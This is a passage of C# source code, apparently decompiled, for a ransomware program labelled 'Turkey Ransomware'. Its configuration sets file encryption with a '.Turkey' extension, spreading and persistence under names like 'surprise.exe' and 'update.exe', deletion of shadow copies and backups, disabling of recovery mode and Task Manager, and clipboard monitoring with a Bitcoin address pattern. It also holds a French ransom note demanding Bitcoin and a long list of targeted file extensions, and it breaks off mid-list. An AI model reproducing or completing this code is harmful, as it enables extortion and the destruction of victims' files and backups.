using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "Turkey";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "update.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"                                                           Turkey Ransomware", "", "Tous vos fichiers ont été chiffrés.", "", "Votre ordinateur a été infecté par un virus ransomware. ", "Vos fichiers ont été chiffrés, et vous ne pourrez pas les décrypter sans notre aide.", "", "", "Que puis-je faire pour récupérer mes fichiers ?", "",
		"Vous pouvez acheter notre logiciel spécial de déchiffrement. ", "Ce logiciel vous permettra de récupérer toutes vos données et de supprimer le ransomware de votre ordinateur.", "", "", "", "Prix du logiciel : 500 $.", "", "Le paiement doit être effectué uniquement en Bitcoin.", "", "",
		"Comment payer et où obtenir des Bitcoins ?", "", "L'achat de Bitcoin varie selon le pays. ", "Nous vous conseillons de faire une recherche rapide sur Google pour savoir comment en acheter.", "", "Beaucoup de nos clients ont trouvé ces sites rapides et fiables :", "", "", "Coinmama - hxxps://www.coinmama.com", "",
		"Bitpanda - hxxps://www.bitpanda.com", "", "Informations de paiement", "", "Montant : 0,0051 ", "Adresse Bitcoin : 1BwrztAYAJW9QsQKjP61XohwhdXjoqCMFq", "Contactez-nous : Ghost_Kir4@proton.me", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
